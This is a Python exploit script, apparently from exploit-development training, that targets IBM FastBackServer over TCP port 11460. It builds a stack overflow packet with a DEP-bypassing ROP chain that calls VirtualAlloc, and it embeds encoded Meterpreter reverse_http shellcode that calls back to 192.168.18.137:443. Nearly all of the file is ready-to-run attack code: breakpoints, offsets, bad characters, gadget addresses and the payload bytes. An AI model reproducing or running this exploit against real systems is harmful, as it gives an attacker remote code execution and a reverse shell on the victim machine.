"""
===============================================================
======================= - Breakpoints - =======================
===============================================================
        bp wsock32!recv
        bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6
        bp FastBackServer!FX_AGENT_Cyclic+0xD0
        bp FastBackServer!FXCLI_OraBR_Exec_Command
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac
        bp FastBackServer!FXCLI_SetConfFileChunk+0x40
===============================================================
================= - Packet/Buffer Structure - =================
===============================================================
        0x00       : Checksum DWORD
        0x04 - 0x34: psAgentCommand
                    - 0x04 - 0xC:  ??
                    - 0x10:         Opcde
                    - 0x14:         Offset for copy operation
                    - 0x18:         Size of copy operation
                    - 0x1C:         Offset for 2nd copy operation
                    - 0x20:         Size of 2nd copy operation
                    - 0x24:         Offset for 3rd copy operation
                    - 0x28:         Size of 3rd copy operation
                    - 0x2C - 0x34: ??
        0x34 - End:  psCommandBuffer

# # Checksum
# buf = pack(">i", 0x2330)

# # psAgentCommand
# buf += bytearray([0x41] * 0x10)
# buf += pack("<i", 0x0)                # 1st memcpy: offset
# buf += pack("<i", 0x1000)             # 1st memcpy: size
# buf += pack("<i", 0x0)                # 2nd memcpy: offset
# buf += pack("<i", 0x1000)             # 2nd memcpy: size
# buf += pack("<i", -0x11000)           # 3rd memcpy: offset
# buf += pack("<i", 0x13000)            # 3rd memcpy: size
# buf += bytearray([0x41] * 0x8)

# # psCommandBuffer
# buf += bytearray([0x45] * 0x100)      # 1st Buffer
# buf += bytearray([0x45] * 0x200)      # 2nd Buffer
# buf += bytearray([0x45] * 0x2000)     # 3rd Buffer
===============================================================

Used MSF-PATTERN_CREATE, found eip at offset 276
                         found esp at offset 280

BAD_CHARS = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
"""

import socket
import sys
from struct import pack

from colorama import Fore, Style, init
from modules.msfvenom_module import generatePayload
from numpy import byte

init()

# Checksum
buf = bytearray()  # Checksum DWORD        0x00 - 0x04

# psAgentCommand
buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
buf += pack("<i", 0x534)  # Opcode                0x10
buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
buf += pack("<i", 0x500)  # 1st memcpy: size      0x18
buf += pack("<i", 0x0)  # 2nd memcpy: offset    0x1C
buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
buf += pack("<i", 0x0)  # 3rd memcpy: offset    0x24
buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34


# psCommandBuffer

VirtualAlloc = pack("<L", (0x45454545))  # Dummy VirtualAlloc Addr
VirtualAlloc += pack("<L", (0x46464646))  # Dummy VirtualAlloc Ret
VirtualAlloc += pack("<L", (0x47474747))  # Dummy Shellcode Addr
VirtualAlloc += pack("<L", (0x48484848))  # Dummy dwSize
VirtualAlloc += pack("<L", (0x49494949))  # Dummy flAllocationType
VirtualAlloc += pack("<L", (0x51515151))  # Dummy flProtect

offset = b"A" * (276 - len(VirtualAlloc))
eip = pack("<L", (0x50501110))  # CSFTPAV6.dll -> PUSH ESP; PUSH EAX; POP EDI; POP ESI; RET | This got me into the stack for exec

# NOTE:: POP requires the value to loaded in  the next 4 bytes to work
# For example, to load ECX with -1
# 0xFFFFFFFF must be the next value right after our POP ECX instruction as the POP instruction increments ESI by 4

# VirtualAlloc(lpVoid lpAddress, size_t dwSize, dword flAllocationType, dword flProtect)
# lpAddress = shellcode addr
# dwSize = 0x1
# flAllocationType = 0x1000 (MEM_COMMIT)
# flProtect = 0x40 (PAGE_EXECUTE_READWRITE)

# ROP Chain to write VirtualAlloc IAT address into ESI
rop = pack("<L", (0x5050118E))  #             MOV EAX, ESI; POP ESI; RETN | Store VirtualAlloc IAT(VA_IAT) into EAX
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x505115A3))  #      -> POP ECX, RET; | Load offset into ECX
rop += pack("<L", (0xFFFFFFE4))  # -0x1c | Load ECX with -28
rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Adjust EAX by subtracting ECX
rop += pack("<L", (0x50537D5B))  #      -> PUSH EAX; POP ESI; RET | Store VirtualAlloc IAT into ESI
rop += pack("<L", (0x5053A0F5))  #      -> POP EAX; RET | Prepare to load VA_IAT + 1
rop += pack("<L", (0x5054A221))  #      -> VirtualAlloc IAT + 1 | Store Manually incremented VA_IAT on stack
rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -1 into ECX
rop += pack("<L", (0xFFFFFFFF))  #      -> mov -1 into ecx | Store -1 on stack for prevInstrcution
rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Add -1 to EAX, gets true VA_IAT
rop += pack("<L", (0x5051F278))  #      -> MOV EAX, dw [EAX]; RET | store dereferenced VA_IAT (VirtualAlloc Addr) into EAX
rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | store VirtualAlloc Addr into ESI (overwrite IAT)

# writing return address for VirtualAlloc
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x5050118E))  #      -> MOV EAX, ESI ; POP ESI ; RET | Save ESI in EAX, then POP stack into ESI
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x5052F773))  #      -> PUSH EAX; POP ESI; RET | Stock into EAX, pop next 4 bytes into ESI
rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -0x210 into ECX
rop += pack("<L", (0xFFFFFDF0))  # -0x210 | Load ECX with -0x210
rop += pack("<L", (0x50533BF4))  #      -> SUB EAX, ECX; RET | Small dummy positive offset to EAX, will point to shellcode
rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | overwrite dummy shellcode with real shellcode address

# fetching & writing lpAddress (shellcode addr) to ESI
# bp 0x5051CBB6
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118E))  # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242))  # junk
rop += pack("<L", (0x5052F773))  # push eax ; pop esi ; ret
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0xFFFFFDF4))  # -0x20c
rop += pack("<L", (0x50533BF4))  # sub eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing dwSize (0x1) to ESI
# bp 0x5051CBB6
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0xFFFFFFFF))  # -1 value that is negated
rop += pack("<L", (0x50527840))  # neg eax ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing flAllocationType (0x1000) to ESI
# bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0x80808080))  # first value to be added
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0x7F7F8F80))  # second value to be added
rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing flProtect (0x40) to ESI
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0x80808080))  # first value to be added
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0x7F7F7FC0))  # second value to be added
rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
rop += pack("<L", (0x50549417))  # push eax ; call esi

# Align stack for VirtualAlloc Exec
# bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
rop += pack("<L", (0x5050118E))  # mov eax, esi; pop esi; ret
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x505115A3))  # pop ecx; ret
rop += pack("<L", (0xFFFFFFE8))  # -0x18 | Load ECX with -0x18
rop += pack("<L", (0x5051579A))  # add eax, ecx; ret | Adjust EAX to point to start of shellcode
rop += pack("<L", (0x5051571F))  # xchg eax, ebp; ret | Set EBP to point to start of shellcode, which will be used as stack for VirtualAlloc
rop += pack("<L", (0x50533CBF))  # mov esp, ebp; pop ebp; ret | Set ESP to point to start of shellcode, prepare for VirtualAlloc call

# Calculated padding to align with return address
padding = b"C" * 0xE0

# increased from 0x400 to 0x600 when using msfvenom
# shellcode = generatePayload(
#     payload="windows/meterpreter/reverse_http",
#     LHOST="192.168.18.137",
#     LPORT=443,
#     bad_chars="\x00\x09\x0a\x0b\x0c\x0d\x20",
#     encoder="x86/shikata_ga_nai",
#     arch="x86",
#     platform="windows",
#     debug=True,
# )
shellcode = b""
shellcode += b"\xdd\xc5\xd9\x74\x24\xf4\x5e\xbf\x35\x8e\xaf"
shellcode += b"\x03\x29\xc9\xb1\x9d\x83\xc6\x04\x31\x7e\x16"
shellcode += b"\x03\x7e\x16\xe2\xc0\x72\x47\x8c\x2a\x8b\x98"
shellcode += b"\xf3\x1b\x59\x11\x16\x3f\xd6\x70\xe9\x34\xba"
shellcode += b"\x78\x82\x18\x2f\xb0\x6b\x17\x3d\x9a\x9c\x90"
shellcode += b"\x88\xfc\x93\x1e\xa0\x3d\xb5\xe2\xbb\x11\x15"
shellcode += b"\xdb\x73\x64\x54\x1c\xc2\x02\xb9\xf0\x5e\xbe"
shellcode += b"\x55\x7f\x22\x03\x01\x7e\x73\xf0\xed\xf8\xf6"
shellcode += b"\xc7\x9a\xb4\xf9\x17\x32\xcf\xa2\xb7\x38\x87"
shellcode += b"\x4a\xb9\xed\x92\xa2\xcd\x2d\xd5\xbf\x1a\xc5"
shellcode += b"\xe4\x69\x53\x26\xd7\x55\x38\x19\xd8\x5b\x40"
shellcode += b"\x5d\xde\x83\x37\x95\x1d\x39\x40\x6e\x5c\xe5"
shellcode += b"\xc5\x71\xc6\x6e\x7d\x56\xf7\xa3\x18\x1d\xfb"
shellcode += b"\x08\x6e\x79\x1f\x8e\xa3\xf1\x1b\x1b\x42\xd6"
shellcode += b"\xaa\x5f\x61\xf2\xf7\x04\x08\xa3\x5d\xea\x35"
shellcode += b"\xb3\x39\x53\x90\xbf\xab\x82\xa4\x3f\x34\xab"
shellcode += b"\xf8\xd7\xa4\x31\x77\x28\x50\xcd\x1e\x46\xc9"
shellcode += b"\x65\x89\xda\x7e\xa0\x4e\x1c\x55\x9d\x8b\xb1"
shellcode += b"\x06\x8d\x78\x65\x40\x46\x7f\x89\x90\xe4\x10"
shellcode += b"\xf3\xf9\x9a\x82\x62\xd6\x57\x75\x55\x08\xb0"
shellcode += b"\xc4\xf4\x2b\xa9\xb8\x82\xc4\x5a\x2d\x50\x3a"
shellcode += b"\xd4\xc3\xd2\x5f\x8a\x3b\x56\xfe\x31\x1c\x27"
shellcode += b"\x53\x96\x04\x97\x62\xe2\xeb\xe0\xdb\x38\x3d"
shellcode += b"\x2f\xa2\x4c\x4d\x43\x41\xfa\xc8\xf9\xc2\x6d"
shellcode += b"\x67\xd1\xe2\x5d\xb2\x03\x3b\xb0\x8d\x6e\x1b"
shellcode += b"\xe4\xa6\xd8\x0f\xb9\x74\xf5\x8f\x2d\xec\x6e"
shellcode += b"\xaa\x8d\xa9\x15\x57\xa5\x5a\xff\xb7\x6f\xc0"
shellcode += b"\x8d\xc4\xe6\x65\x1c\x05\xc8\x4e\xce\x6d\x04"
shellcode += b"\x80\x2e\xde\x39\x84\x4f\x92\xd0\x67\xa6\x62"
shellcode += b"\x16\x56\xf7\xac\x69\x93\xf7\xd8\xb3\x8d\x8e"
shellcode += b"\xbf\x3b\xe4\x22\xec\xa9\x04\x96\x41\x46\x9b"
shellcode += b"\x07\x65\x96\x73\x25\x64\x96\x83\x65\x57\xd3"
shellcode += b"\xcf\x0f\xdd\x8e\xaa\x95\xbb\x61\x7e\x5e\x4f"
shellcode += b"\xe0\xed\xae\x9f\xb6\xa9\x9f\x9d\x67\x41\x4e"
shellcode += b"\x15\xd9\x88\xfa\x11\xb6\x93\x44\xd3\x38\x6e"
shellcode += b"\x2c\x87\xcb\xbf\xc9\x30\x7c\xf2\x5d\xcd\x33"
shellcode += b"\x91\x1c\x7a\x9d\x1f\xaf\x12\x48\xee\x8c\xd9"
shellcode += b"\x03\xa1\x4a\x4a\xb4\x7e\x5d\x47\x65\xfb\xe3"
shellcode += b"\xeb\xe6\xb6\xd1\xc2\x92\x71\x74\x47\x57\xef"
shellcode += b"\x1e\xc8\xce\x9e\xeb\xe6\xb4\x55\x70\x43\x02"
shellcode += b"\xf4\x2c\x79\x1a\xc1\x8a\x2d\x8b\x68\x4c\x97"
shellcode += b"\x7c\xf1\x38\x6f\xb2\x61\xdf\x04\xe4\x3b\x5d"
shellcode += b"\x9b\x4c\x8b\x2e\x41\x23\x90\xc4\x44\xe9\x3f"
shellcode += b"\x40\xc3\x5d\x89\xcd\x7d\x3d\x6b\xb4\xea\xf3"
shellcode += b"\x07\x40\xaf\xb0\x83\x87\x61\x7d\x4f\x90\x4a"
shellcode += b"\xf3\xeb\x59\xf0\xf3\xa3\xf1\xaf\x7a\xdc\xc4"
shellcode += b"\xb0\xa8\x6a\x0e\x1d\x3b\x6d\x8d\xc9\x3f\x3e"
shellcode += b"\xc2\x5a\x17\x92\xb2\x34\x7c\x41\x15\xff\x7d"
shellcode += b"\xbf\xff\x95\x8b\x1f\x53\x3a\xdf\xcc\x05\xd4"
shellcode += b"\xf2\xf4\xb1\x5f\xf2\x2c\x44\x5f\x79\xdb\x2f"
shellcode += b"\xd7\x91\xe3\xaf\x8f\xd1\x13\x9a\xaf\x25\x06"
shellcode += b"\xaa\x5a\x3b\x41\x7e\xa4\xbb\x92\xeb\xe4\xd3"
shellcode += b"\x92\xfb\xe4\x23\xfb\xfb\xe4\x63\xfb\xa8\x8c"
shellcode += b"\x3b\x5f\x1d\xa9\x43\x4a\x31\x62\xef\xfc\xd1"
shellcode += b"\xd3\x67\xff\x3d\xdb\x77\xac\x6b\xb3\x65\xc4"
shellcode += b"\x1d\xa1\x75\x3d\x98\xe5\xfe\x71\x28\xe2\xff"
shellcode += b"\x4e\xaa\x2c\x8a\xb5\xed\x6f\x2a\xde\x71\x90"
shellcode += b"\x2a\xe1\xbf\x57\xe7\x30\xf1\x91\x3f\x63\xc0"
shellcode += b"\xe5\x11\x4a\x11\x22\x6e\x17\xa5\xf9\xcc\x31"
shellcode += b"\x2c\x01\x42\x41\x65"

buffer = offset + VirtualAlloc + eip + rop + padding + shellcode

buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04


def printBuffer(buf, width="db"):
    if width == "db":
        w = 1
        groups_per_line = 16
    elif width == "dw":
        w = 2
        groups_per_line = 8
    elif width == "dd":
        w = 4
        groups_per_line = 4
    else:
        print(f"ERR: Invalid width {width}")
        exit(-1)
    bytes_per_line = groups_per_line * w
    for i in range(0, len(buf), bytes_per_line):
        print(
            Fore.YELLOW + f"\t" + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: " + Style.RESET_ALL,
            end="",
        )
        for g in range(groups_per_line):
            start = i + g * w
            if start >= len(buf):
                break
            if width == "db":
                for j in range(w):
                    if start + j < len(buf):
                        print(f"{buf[start+j]:02x}", end=" ")
                    else:
                        print("  ", end="")
            else:
                val = 0
                for j in range(w):
                    if start + j < len(buf):
                        val |= buf[start + j] << (8 * (w - 1 - j))
                if width == "dw":
                    print(f"{val:04x}", end=" ")
                elif width == "dd":
                    print(f"{val:08x}", end=" ")
        print()


def main():
    if len(sys.argv) != 2:
        print(f"ERR: No ip addr provided")
        exit(-1)

    server = sys.argv[1]
    port = 11460

    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
        printBuffer(buf, width="dd")
        s.send(buf)
        s.close()

        sys.exit(0)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
        sys.exit(1)


if __name__ == "__main__":
    main()
